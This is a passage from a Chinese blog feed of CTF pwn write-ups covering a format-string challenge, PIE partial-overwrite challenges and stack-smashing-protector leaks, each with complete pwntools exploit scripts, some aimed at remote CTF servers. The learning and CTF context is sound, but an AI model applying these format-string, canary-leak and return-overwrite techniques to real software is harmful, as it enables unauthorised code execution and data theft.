src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%876.png" alt><br>其实看这个就能知道flag写在了末尾一个半字节为a10的地方，没关系，我们接着调。</p><p>我们输入%1$p发现它跳到了一个地方<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%877.png" alt></p><p>发现其实它还没输出东西，那我们就继续往下执行，到printf执行之后，打印出第一个偏移处的地址<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%878.png" alt></p><p>然后ida里，可以看见就在printf下面，那我们就算this的位置偏移是多少（数出来是19）<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%879.png" alt><br>我们修改一下ebp的地址，使他指向堆的地址（上面有说到第26个偏移的地方指向堆的地址，我们就把它改到ebp），然后我们把ebp2里指向的堆地址改成this+1的地址</p><p>我们tel一下查看堆里的信息，发现其实this+1里存的是flag的地址（上面的flag是自己本机的）<br><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%8710.png" alt><br>然后我们就可以通过%19$s输出真实地址<br>再把它写入ebp2，然后再执行%19$s就可以了<br>Po个exp（来自一位特别特别好的大佬）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = &apos;%6$p&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">################## ebp&amp;ret</span><br><span class="line">log_ebp = int(p.recv(),16)#logo ebp 14$ 0xffffd048</span><br><span class="line">do_fmt_ebp = log_ebp - 0x20#do fmt ebp 6$ 0xffffd028</span><br><span class="line">do_fmt_return = log_ebp -0x1c#do_fmt return_to 7$</span><br><span class="line"></span><br><span class="line">log.info(&quot;log_ebp--&gt;p[%s]&quot;%hex(log_ebp))</span><br><span class="line">log.info(&quot;do_fmt_ebp1--&gt;p[%s]&quot;%hex(do_fmt_ebp))</span><br><span class="line">log.info(&quot;do_fmt_return--&gt;p[%s]&quot;%hex(do_fmt_return))</span><br><span class="line">#################3 this_addr,flag_addr_off</span><br><span class="line"></span><br><span class="line">payload = &apos;%19$p&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">heap_addr=int(p.recv(),16)#0x8050e30</span><br><span class="line">flag_addr_off=heap_addr+4 #0x8050e34</span><br><span class="line">log.info(&apos;heap_addr--&gt;p[%s]&apos;%hex(heap_addr))</span><br><span class="line">log.info(&apos;flag_addr_off--&gt;p[%s]&apos;%hex(flag_addr_off))</span><br><span class="line"></span><br><span class="line">################# change this to *flag on stack</span><br><span class="line">heap_addr_part=heap_addr &amp; 0xFF#0e30</span><br><span class="line">log_ebp_part=log_ebp &amp; 0xFF#d048</span><br><span class="line">heap_addr_stack_part=(log_ebp+0x14)&amp;0xFF#D05c</span><br><span class="line"></span><br><span class="line">log.info(&apos;heap_addr_part--&gt;p[%s]&apos;%hex(heap_addr_part))</span><br><span class="line">log.info(&apos;log_ebp_part--&gt;p[%s]&apos;%hex(log_ebp_part))</span><br><span class="line">log.info(&apos;heap_addr_stack_part--&gt;p[%s]&apos;%hex(heap_addr_stack_part))</span><br><span class="line"></span><br><span class="line">payload=&apos;%&apos;+str(heap_addr_stack_part)+&apos;d%6$hhn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload=&apos;%&apos;+str(heap_addr_part+4)+&apos;d%14$hhn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">################# leak flag_addr</span><br><span class="line">payload=&apos;%19$s\x00&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">flag_addr=u32(p.recv(4))</span><br><span class="line">#################</span><br><span class="line">payload=&apos;%&apos;+str(flag_addr&amp;0xFFFF)+&apos;d%14$hn&apos;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;134515884&apos;)  #%1$p的地址 0x8048CAC</span><br><span class="line">p.sendline(&apos;%19$s\x00&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()`</span><br></pre></td></tr></table></figure><p>我们前面不是可以知道那个flag到底是读在了a10的地方吗？那我们就直接改一个，把一个指向栈地址的改成指向堆地址的地址，就是偏移为6的那个地方啦，然后直接修改堆的低地址（18偏移的地方地址为a28,离flag的地方特别近，直接改低一个字节的地址就可以了，贼方便了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"># p = remote(&apos;120.78.192.35&apos;,9999)</span><br><span class="line">p = process(&apos;./playfmt&apos;)</span><br><span class="line">elf = ELF(&apos;./playfmt&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;=\n&quot;)</span><br><span class="line">p.sendlineafter(&quot;=\n&quot;,&quot;%6$p&quot;)</span><br><span class="line">s = p.recvuntil(&quot;\n&quot;)</span><br><span class="line">stack_addr = int(s.strip(),16)</span><br><span class="line">print hex(stack_addr)</span><br><span class="line"></span><br><span class="line">stack = stack_addr + 0x10</span><br><span class="line">p.sendline(&quot;%&quot; + str(stack&amp;0xff) + &quot;c%6$hhn&quot;)</span><br><span class="line">p.sendline(&quot;%16c%14$hhn&quot;)</span><br><span class="line">p.sendline(&quot;%18$s&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/08/20/playfmt/%E5%9B%BE%E7%89%8711.png" alt></p><p>这道题真实的flag好像是suctf{P_rin_Tfo}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了&lt;/p&gt;
&lt;p&gt;以下附上超级简单题的一些思路，当做给自己的记录吧&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="wp" scheme="https://c0yo7e.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>partial overwrite</title>
    <link href="https://c0yo7e.github.io/2019/08/16/overwrite/"/>
    <id>https://c0yo7e.github.io/2019/08/16/overwrite/</id>
    <published>2019-08-16T07:00:49.000Z</published>
    <updated>2020-08-02T05:12:42.640Z</updated>
    
    <content type="html"><![CDATA[<h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。<br>（对于绕过PIE的操作我是没怎么接触过的）<br>大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去</p><a id="more"></a><h1 id="Babypie"><a href="#Babypie" class="headerlink" title="Babypie"></a>Babypie</h1><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%871.png" alt><br>这是一道保护全开的题<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%872.png" alt></p><p>看到主程序，发现有两处写入</p><p>Read函数的最大问题大概就是它不会给末尾加’\0’所以可以leak地址<br>leak canary<br>在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。<br>为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 （因为canary的低位是\x00截断符，先用\x01去覆盖这个低位，然后打印出来后面的7位，最后加上\x00即可）、</p><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%873.png" alt></p><p>发现有个可以直接getshell的函数，直接可以调用<br>我们用第一个输入点把canary爆出来，然后第二个调用可以直接getshell的函数</p><p>然后exp的话，因为开了PIE所以只能知道低三位的地址，第四位得靠爆（真的是随缘的那种）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">try:</span><br><span class="line">p = process(&apos;./babypie&apos;)</span><br><span class="line"></span><br><span class="line">p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">p.recvuntil(&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">canary = &apos;\0&apos; + p.recvn(7)</span><br><span class="line">print &quot;canary:&quot; + hex(u64(canary))</span><br><span class="line">p.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">except EOFError:</span><br><span class="line">p.close()</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><p>爆破了n遍之后终于。。。<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%874.png" alt></p><p>然后发现，直接覆盖低两位地址就好了嘛！（read和system的函数贼接近，前面都是一样的，真的是要哭了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./babypie&apos;)</span><br><span class="line">p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">p.recvuntil(&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">canary = &apos;\0&apos; + p.recvn(7)</span><br><span class="line">print &quot;canary:&quot; + hex(u64(canary))</span><br><span class="line">payload = &apos;&apos;</span><br><span class="line">payload += &apos;a&apos;* 0x28 + canary + &apos;aaaaaaaa&apos; + &apos;\x3E&apos;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>效果长这样<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%875.png" alt></p><h1 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h1><p>这题没开pie，但它选择覆盖那里我还是挺懵的，就是两个真实地址，<strong>libc_start_main+192 和 _dl_init+139<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%876.png" alt><br>我们到底选择覆盖哪个呢？这就很茫然了<br>Wiki上说的是：<br>我们一般要覆盖字节的话，至少要覆盖 1 个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 gets读取的，也就意味着字符串的末尾肯定会存在\x00。<br>而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看</strong>libc_start_main+240 的地址 0x7ffff7a2d830（我这里是800），如果覆盖 3 个字节，那么就是 0x7ffff700xxxx，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。<br>一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 __libc_start_main+240 ，显然是不可能的。<br>而 ld 的基地址呢？如果我们覆盖了栈上_dl_init+139，即为0x7ffff700xxxx。而观察上述的内存布局，我们可以发现libc位于 ld 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为\x00 的。<br>举个例子，目前两者之间的偏移为<br>0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000<br>那么如果 ld 被加载到了 0x7ffff73ca000，则显然 libc 的起始地址就是0x7ffff7000000。<br>然后就理所当然选_dl_init了（我觉得可能是libc是程序开始的地方，离我们要覆盖到的地址有点远，所以选一个近一点的）</p><p>所以由上面调试的截图可以看出，我们输完0x18个字符下一个ret处就是libc的地址了，而init离它还有18个偏移(a8-18=90—&gt;8个字节为一个偏移）</p><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%877.png" alt><br>然后我们找一个能用的onegadget<br>我们写个payload看看可不可以跑（估计要跑个六七万次，太难了啊）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">common_gadget = 0x40059B</span><br><span class="line">def exp():</span><br><span class="line">    for i in range(0x100000):</span><br><span class="line">        # if args[&apos;REMOTE&apos;]:</span><br><span class="line">        #     p = remote(ip, port)</span><br><span class="line">        # else:</span><br><span class="line">        #     p = process(&apos;./gets&apos;)</span><br><span class="line">        # # gdb.attach(p)</span><br><span class="line">        p = process(&apos;./gets&apos;)</span><br><span class="line">        try:</span><br><span class="line">            payload = 0x18 * &apos;a&apos; + p64(common_gadget)</span><br><span class="line">            for _ in range(2):</span><br><span class="line">                payload += &apos;a&apos; * 0x28 + p64(common_gadget)</span><br><span class="line">            payload += &apos;a&apos; * 0x28 + &apos;\x16\02&apos;</span><br><span class="line">            p.sendline(payload)</span><br><span class="line"></span><br><span class="line">            p.sendline(&apos;ls&apos;)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            print data</span><br><span class="line">            p.interactive()</span><br><span class="line">            p.close()</span><br><span class="line">        except Exception:</span><br><span class="line">            p.close()</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>之前偶然跑出来一次，然后再没跑出来了……先放个exp，改天再试试</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;partial-overwrite&quot;&gt;&lt;a href=&quot;#partial-overwrite&quot; class=&quot;headerlink&quot; title=&quot;partial overwrite&quot;&gt;&lt;/a&gt;partial overwrite&lt;/h2&gt;&lt;p&gt;我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。&lt;br&gt;（对于绕过PIE的操作我是没怎么接触过的）&lt;br&gt;大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>ssp操作</title>
    <link href="https://c0yo7e.github.io/2019/08/16/ssp/"/>
    <id>https://c0yo7e.github.io/2019/08/16/ssp/</id>
    <published>2019-08-16T03:39:15.000Z</published>
    <updated>2020-08-02T05:13:41.394Z</updated>
    
    <content type="html"><![CDATA[<p>用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串<br>就是通过栈溢出报错信息，泄漏出指定地址的方法：<br>　　stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p><a id="more"></a><p>满足条件为<br>1、开了canary<br>2、Flag在程序内</p><p>看wiki里的花式栈溢出的时候看到的题（其实我很迷为啥把它放到花式栈溢出里，之后再细细研究吧）</p><p>关于stack smash</p><p>这个有点开拓我知识面了，对于canary我一直很迷，看到这里才知道canary操作起来是个啥样子的。<br>Wiki原话：</p><p>在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行?__stack_chk_fail?函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。<br>代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125;</span><br></pre></td></tr></table></figure><p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在?__fortify_fail?函数中就会输出我们想要的信息</p><h2 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h2><p>所以我们要找argv[0]的地址，（因为我们要求的偏移就是argv[0] 距离读取的字符串的偏移）</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%871.png" alt></p><p>程序名指向的地址为e159，但是dd98里存放的是指向程序名的地址，所以我们需要的地址为后者<br>接着在输入的地方下个断点，找上一个rsp作为字符串开始的地址</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%872.png" alt></p><p>然后我们就可以算偏移了</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%873.png" alt></p><p>所以我们的偏移为0x218</p><p>看程序会发现在一个地方会有flag的输出</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%874.png" alt></p><p>但是我们看不到flag是什么<br>最无奈的是我们输入的内容会覆盖整个地址，所以我们没有办法直接读出<br>我们只能去找另一处的flag地址，这就接触到里另一个新的知识点了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找（pwndbg的话就用search吧）</span><br></pre></td></tr></table></figure><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%875.png" alt></p><p>现在就可以写exp了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># p = process(&apos;./smashes&apos;)</span><br><span class="line">p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)</span><br><span class="line"></span><br><span class="line">flag = 0x0400D20</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x218 + p64(flag)</span><br><span class="line">p.recvuntil(&apos;name? &apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;flag: &apos;)</span><br><span class="line">p.sendline(&apos;CTF&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里很坑的就是我找flag是按照程序里给的格式找的，是CTF开头的，但是真正的flag是PCTF（0x600d20那个位置的0x50转字符就是P），所以它的地址得再往前拨一位</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%876.png" alt></p><h2 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h2><p>再来做道GUESS<br>这题有三次的输入，我们可以通过三次输入实现我们的leak和读取flag，这题和上面那题的思路大概是一致的，都是读取栈上的字符串，而不需要getshell（上面那题是可以知道flag具体存在哪里了，这题需要libc找）</p><p>本题思路：</p><p>1.泄漏libc的基址<br>2.泄漏environ的地址（也就是栈的地址）<br>3.泄漏flag</p><p>三次泄漏都用到了上一题说的ssp，就是通过栈溢出报错信息，泄漏出指定地址的方法：stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p><p>对environ很迷的我看了一下23R3F大佬的wp，又发现了新的玩意儿(以下来自大佬博客<a href="https://www.jianshu.com/p/cc9d09a3f65f)：" target="_blank" rel="noopener">https://www.jianshu.com/p/cc9d09a3f65f)：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments?section）</span><br><span class="line">用来存储系统环境变量的一份复制文件，进程在运行时可能需要。</span><br><span class="line">例如，运行中的进程，可以通过环境变量来访问路径、shell?名称、主机名等信息。</span><br><span class="line">该节是可写的，因此在格式串（format?string）和缓冲区溢出（buffer?overflow）攻击中都可以攻击该节。</span><br><span class="line">*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。</span><br></pre></td></tr></table></figure><p>好，我们按照刚刚那题的解题步骤，先找argv[0]和字符串开始的地方来计算偏移</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%877.png" alt></p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%878.png" alt></p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%879.png" alt></p><p>算出偏移我们就可以按照思路来写exp了<br>前面两个part如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./GUESS&apos;)</span><br><span class="line">elf = ELF(&apos;./GUESS&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line"># open_flag = 0x400A9A</span><br><span class="line"># argv = 0x7fffffffdda8</span><br><span class="line"># rsi_addr = 0x7fffffffdc80</span><br><span class="line"># distance = 0x128</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x128 + p64(puts_got)</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;) </span><br><span class="line">puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) </span><br><span class="line"># puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) </span><br><span class="line">print &quot;puts_addr:&quot;+hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[&apos;puts&apos;] </span><br><span class="line">environ_addr = libc_base + libc.symbols[&apos;_environ&apos;] </span><br><span class="line">print &quot;libc_base:&quot;+hex(libc_base) </span><br><span class="line">print &quot;environ:&quot;+hex(environ_addr)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x128 + p64(environ_addr) </span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;) </span><br><span class="line">stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) </span><br><span class="line"># stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) </span><br><span class="line">print &quot;stack_addr:&quot;+hex(stack_addr)</span><br></pre></td></tr></table></figure><p>然后我们要算出buf与environ的差值，使程序跳转到flag的位置</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%8710.png" alt></p><p>构造最后一步的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x128 + p64(stack_addr-0x168)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><p>最后效果</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%8711.png" alt></p><p>其实还是挺迷的，以后碰到题可能还会懵，先记录着吧</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串&lt;br&gt;就是通过栈溢出报错信息，泄漏出指定地址的方法：&lt;br&gt;　　stack smashing detected:+argv[0]&lt;br&gt;如果我们覆盖argv[0]，便会输出特定字符串&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>libc_csu</title>
    <link href="https://c0yo7e.github.io/2019/07/08/libc-csu/"/>
    <id>https://c0yo7e.github.io/2019/07/08/libc-csu/</id>
    <published>2019-07-08T15:15:17.000Z</published>
    <updated>2020-08-02T05:12:00.237Z</updated>
    
